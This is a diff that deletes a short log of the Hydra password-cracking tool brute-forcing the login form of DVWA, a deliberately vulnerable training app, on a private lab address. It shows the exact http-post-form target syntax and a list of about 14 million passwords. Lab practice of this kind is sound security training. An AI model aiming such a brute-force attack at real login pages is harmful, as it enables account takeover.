@@ -1,8 +1,0 @@
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-22 22:59:49
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking http-post-form://192.168.20.101:8081/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
-[STATUS] 4639.00 tries/min, 4639 tries in 00:01h, 14339760 to do in 51:32h, 16 active
-[STATUS] 4729.00 tries/min, 14187 tries in 00:03h, 14330212 to do in 50:31h, 16 active
-[STATUS] 4754.00 tries/min, 33278 tries in 00:07h, 14311121 to do in 50:11h, 16 active
